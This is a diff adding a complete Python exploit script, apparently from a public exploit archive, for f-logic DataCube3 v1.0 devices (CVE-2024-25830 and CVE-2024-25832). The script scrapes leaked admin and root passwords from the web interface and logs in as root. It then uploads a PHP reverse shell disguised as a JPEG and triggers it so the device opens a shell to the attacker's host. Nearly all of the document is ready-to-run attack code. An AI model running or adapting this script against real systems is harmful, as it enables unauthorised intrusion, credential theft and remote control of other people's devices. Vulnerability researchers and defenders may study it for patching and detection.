@@ -1,0 +1,152 @@
+id: 39431
+date: 03/11/2024
+title: DataCube3 v1.0 - Unrestricted file upload Remote Code Execution Exploit
+author: Samy Younsi
+cves: CVE-2024-25832, CVE-2024-25830
+
+# Exploit Title: DataCube3 v1.0 - Unrestricted file upload 'RCE'
+# Exploit Author: Samy Younsi - NS Labs (https://neroteam.com)
+# Vendor Homepage: https://www.f-logic.jp
+# Software Link: https://www.f-logic.jp/pdf/support/manual_product/manual_product_datacube3_ver1.0_sc.pdf
+# Version: Ver1.0
+# Tested on: DataCube3 version 1.0 (Ubuntu)
+# CVE : CVE-2024-25830 + CVE-2024-25832
+
+# Exploit chain reverse shell, information disclosure (root password leak) + unrestricted file upload
+
+from __future__ import print_function, unicode_literals
+from bs4 import BeautifulSoup
+import argparse
+import requests
+import json
+import urllib3
+import re
+urllib3.disable_warnings()
+
+def banner():
+  dataCube3Logo = """ 
+        ▒▒▒▒▒▒████████████████████████████████████▓▓▓▓▓▓▓▓
+      ▒▒▒▒▒▒▒▒██        DataCube3   Ver1.0      █F-logic▓▓
+      ▒▒████▒▒██        ████        ████        ██▓▓▓▓▓▓▓▓
+      ▒▒████▒▒██        ████        ████        ██▓▓▓▓▓▓▓▓
+      ▒▒▒▒▒▒▒▒██        ████        ████        ██▓▓▓▓▓▓▓▓
+      ▒▒▒▒▒▒▒▒██                                ██▓▓████▓▓
+      ▒▒▒▒▒▒▒▒██        ██             ██       ██▓▓████▓▓
+      ▒▒▒▒▒▒▒▒██        █████████████████       ██▓▓▓▓▓▓▓▓
+        ▒▒▒▒▒▒████████████████████████████████████▓▓▓▓▓▓                                       
+                                                                                 
+\033[1;92mSamy Younsi (Necrum Security Labs)\033[1;m         \033[1;91mDataCube3 exploit chain reverse shell\033[1;m                                                 
+                FOR EDUCATIONAL PURPOSE ONLY.   
+  """
+  return print('\033[1;94m{}\033[1;m'.format(dataCube3Logo))
+
+
+def extractRootPwd(RHOST, RPORT, protocol):
+  url = '{}://{}:{}/admin/config_all.php'.format(protocol, RHOST, RPORT)
+  try:
+    response = requests.get(url, allow_redirects=False, verify=False, timeout=20)
+    if response.status_code != 302:
+      print('[!] \033[1;91mError: DataCube3 web interface is not reachable. Make sure the specified IP is correct.\033[1;m')
+      exit()
+    soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser')
+    scriptTag = str(soup.find_all('script')[12]).replace(' ', '')
+    rawLeakedData = re.findall('configData:.*,', scriptTag)[0]
+    jsonLeakedData = json.loads('[{}]'.format(rawLeakedData.split('configData:[')[1].split('],')[0]))
+    adminPassword = jsonLeakedData[12]['value']
+    rootPassword = jsonLeakedData[14]['value']
+    print('[INFO] DataCube3 leaked credentials successfully extracted: admin:{} | root:{}.\n[INFO] The target must be vulnerable.'.format(adminPassword, rootPassword))
+    return rootPassword
+  except:
+    print('[ERROR] Can\'t grab the DataCube3 version...')
+
+
+def generateAuthCookie(RHOST, RPORT, protocol, rootPassword):
+  print('[INFO] Generating DataCube3 auth cookie ...')
+  url = '{}://{}:{}/admin/config_all.php'.format(protocol, RHOST, RPORT)
+  data = {
+    'user_id': 'root',
+    'user_pw': rootPassword,
+    'login': '%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3'
+  }
+  try:
+    response = requests.post(url, data=data, allow_redirects=False, verify=False, timeout=20)
+    if response.status_code != 302:
+      print('[!] \033[1;91mError: An error occur while trying to get the auth cookie, is the root password correct?\033[1;m')
+      exit()
+    authCookie = response.cookies.get_dict() 
+    print('[INFO] Authentication successful! Auth Cookie: {}'.format(authCookie))  
+    return authCookie
+  except:
+    print('[ERROR] Can\'t grab the auth cookie, is the root password correct?')
+
+
+def extractAccesstime(RHOST, RPORT, LHOST, LPORT, protocol, authCookie):
+  print('[INFO] Extracting Accesstime ...')
+  url = '{}://{}:{}/admin/setting_photo.php'.format(protocol, RHOST, RPORT)
+  try:
+    response = requests.get(url, cookies=authCookie, allow_redirects=False, verify=False, timeout=20)
+    if response.status_code != 302:
+      print('[!] \033[1;91mError: An error occur while trying to get the accesstime value.\033[1;m')
+      exit()
+    soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser')
+    accessTime = soup.find('input', {'name': 'accesstime'}).get('value')
+    print('[INFO] AccessTime value: {}'.format(accessTime))
+    return accessTime
+  except:
+    print('[ERROR] Can\'t grab the accesstime value, is the root password correct?')
+
+
+def injectReverseShell(RHOST, RPORT, LHOST, LPORT, protocol, authCookie, accessTime):
+  print('[INFO] Injecting PHP reverse shell script ...')
+  filename='rvs.php'
+  payload = '<?php $sock=fsockopen("{}",{});$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>'.format(LHOST, LPORT)
+
+  data = '-----------------------------113389720123090127612523184396\r\nContent-Disposition: form-data; name="add"\r\n\r\nå��ç��è¿½å�\xA0\r\n-----------------------------113389720123090127612523184396\r\nContent-Disposition: form-data; name="addPhoto"; filename="{}"\r\nContent-Type: image/jpeg\r\n\r\n{}\r\n-----------------------------113389720123090127612523184396\r\nContent-Disposition: form-data; name="accesstime"\r\n\r\n{}\r\n-----------------------------113389720123090127612523184396--\r\n'.format(filename, payload, accessTime)
+
+  headers = {
+      'Content-Type': 'multipart/form-data; boundary=---------------------------113389720123090127612523184396'
+  }
+  url = '{}://{}:{}/admin/setting_photo.php'.format(protocol, RHOST, RPORT)
+  try:
+    response = requests.post(url, cookies=authCookie, headers=headers, data=data, allow_redirects=False, verify=False, timeout=20)
+    if response.status_code != 302:
+        print('[!] \033[1;91mError: An error occur while trying to upload the PHP reverse shell script.\033[1;m')
+        exit()
+    shellURL = '{}://{}:{}/images/slideshow/{}'.format(protocol, RHOST, RPORT, filename)
+    print('[INFO] PHP reverse shell script successfully uploaded!\n[INFO] SHELL URL: {}'.format(shellURL))
+    return shellURL
+  except:
+    print('[ERROR] Can\'t upload the PHP reverse shell script, is the root password correct?')
+
+
+def execReverseShell(shellURL):
+  print('[INFO] Executing reverse shell...')
+  try:
+    response = requests.get(shellURL, allow_redirects=False, verify=False)
+    print('[INFO] Reverse shell successfully executed.')
+    return
+  except Exception as e:
+      print('[ERROR] Reverse shell failed. Make sure the DataCube3 device can reach the host {}:{}')
+      return False
+
+
+def main():
+  banner()
+  args = parser.parse_args()
+  protocol = 'https' if args.RPORT == 443 else 'http'
+  rootPassword = extractRootPwd(args.RHOST, args.RPORT, protocol)
+  authCookie = generateAuthCookie(args.RHOST, args.RPORT, protocol, rootPassword)
+  accessTime = extractAccesstime(args.RHOST, args.RPORT, args.LHOST, args.LPORT, protocol, authCookie)
+  shellURL = injectReverseShell(args.RHOST, args.RPORT, args.LHOST, args.LPORT, protocol, authCookie, accessTime)
+  execReverseShell(shellURL)
+
+
+if __name__ == '__main__':
+  parser = argparse.ArgumentParser(description='Script PoC that exploit an unauthenticated remote command injection on f-logic DataCube3 devices.', add_help=False)
+  parser.add_argument('--RHOST', help='Refers to the IP of the target machine. (f-logic DataCube3 device)', type=str, required=True)
+  parser.add_argument('--RPORT', help='Refers to the open port of the target machine. (443 by default)', type=int, required=True)
+  parser.add_argument('--LHOST', help='Refers to the IP of your machine.', type=str, required=True)
+  parser.add_argument('--LPORT', help='Refers to the open port of your machine.', type=int, required=True)
+  main()
+
+#  0day.today [2024-03-15]  #
